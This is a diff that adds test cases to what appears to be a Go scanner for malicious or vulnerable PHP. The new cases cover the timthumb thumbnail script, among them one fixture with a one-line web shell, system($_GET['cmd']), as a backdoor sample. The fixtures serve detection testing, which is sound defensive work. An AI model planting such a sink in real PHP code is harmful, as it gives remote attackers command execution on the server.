@@ -157,6 +157,37 @@ $key = ImPlOdE ('', ArRaY (ChR (116), ChR (121), ChR (112), ChR (101)));`,
 			rule:   "php_hex_escaped_url",
 			sample: `<?php $url = "https://api.example.test";`,
 		},
+		{
+			name: "hardened timthumb with webshot disabled",
+			rule: "exploit_timthumb",
+			sample: `<?php
+if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
+class timthumb {
+    public static $version = '2.8.14';
+    function run() {
+        $nullImg = base64_decode("R0lGODlhUAAMAIAAAP8AAP");
+        $fp = fopen($this->cachefile, 'rb');
+        @fpassthru($fp);
+    }
+}`,
+		},
+		{
+			name: "webshot-enabled timthumb",
+			rule: "exploit_timthumb",
+			want: true,
+			sample: `<?php
+define('WEBSHOT_ENABLED', true);
+function timthumb() { /* remote fetch, webshot RCE reachable */ }`,
+		},
+		{
+			name: "backdoored timthumb with injected exec sink",
+			rule: "exploit_timthumb",
+			want: true,
+			sample: `<?php
+if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
+function timthumb() {}
+system($_GET['cmd']);`,
+		},
 	}
 
 	for _, tc := range tests {
